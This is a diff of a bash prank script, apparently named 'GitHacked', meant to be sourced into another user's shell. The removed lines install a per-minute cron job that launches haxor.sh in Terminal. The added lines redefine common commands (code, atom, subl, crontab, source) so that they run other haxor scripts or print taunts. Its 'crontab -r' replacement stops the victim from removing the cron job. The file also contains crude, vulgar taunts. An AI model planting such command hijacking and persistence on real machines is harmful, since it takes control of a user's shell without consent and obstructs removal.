@@ -1,37 +1,131 @@
 #!/bin/bash
-hax()
+
+code()
 {
-    chmod +x haxor.sh;
-    chmod +x haxor2.sh;
-    chmod +x haxor3.sh;
-    #https://stackoverflow.com/questions/878600/how-to-create-a-cron-job-using-bash-automatically-without-the-interactive-editor
-    #write out current crontab
-    crontab -l > haxcron;
-    #echo new cron into cron file
-    echo "*/1 * * * * open -a Terminal.app ~/GitHacked/haxor.sh" >> haxcron;
-    #install new cron file
-    crontab haxcron;
-    rm haxcron;
-    alias f='crontab';
+    case $@ in
+
+    .)
+        echo "Hey no fair, you can't do that here"
+        ;;
+    *)
+        sh haxor3.sh
+        ;;
+    esac;
+}
+
+atom()
+{
+    case $@ in
+
+    .)
+        echo "Why you using atom?";
+        sleep 1;
+        echo "Bruh you lucky I'm just on the terminal or I might have to slide you...";
+        sleep 2;
+        echo "watch your back g"
+        ;;
+    *)
+        sh haxor4.sh
+        ;;
+
+    esac;
+
+}
+
+subl()
+{
+    case $@ in
+
+    *)
+        echo "can't let you do that xd"
+    ;; 
+
+    esac;
 }
 
 unhack()
 {
-    crontab -r;
-    open -a Terminal.app ~/GitHacked/haxor3.sh;
+   sh .thesupersecretanswer;
 }
 
-function f()
+
+crontab()
 {
-    case $1 in
+    #https://www.tutorialkart.com/bash-shell-scripting/bash-case/
+    case $@ in
 
     -l)
-    sh haxor2.sh
-    ;;
+        sh haxor4.sh
+        ;;
+
+    -r)
+        echo 'Oh noe mah weakness T_T';
+        sleep 2;
+        echo 'lol! You wish'
+        ;;
 
     *)
-    sh haxor2.sh
+        echo 'I wish I knew what you meant ;)'
+        ;;
+
+    esac;
+}
+
+source()
+{
+    case $@ in 
+
+    *)
+        sh haxor2.sh 
+        ;;
+    esac;
+}
+
+
+help()
+{
+    echo "Maybe you could try the 'unhack' command...";
+    sleep 1;
+    echo "It makes sense, why not try it? ;)";
+}
+
+
+
+
+
+
+
+
+
+
+#This is ment to be hidden... slightly hidden
+fuck()
+{
+    case $@ in
+
+    you)
+        echo 'You wish you were that lucky'
     ;;
 
-    esac
+    me)
+        echo "I'm not desparate you know"
+    ;;
+
+    off)
+        echo "But I just arrived ;)"
+        ;;
+    of)
+        echo "Nearly there, one more 'o' buddy, No need to thank me :)"
+        ;;
+
+    yourself)
+        echo 'No, come fu** me yourself, coward...'
+    ;;
+
+    esac;
+}
+
+fuckyou()
+{
+    echo "try it again but with a space inbetween";
 }
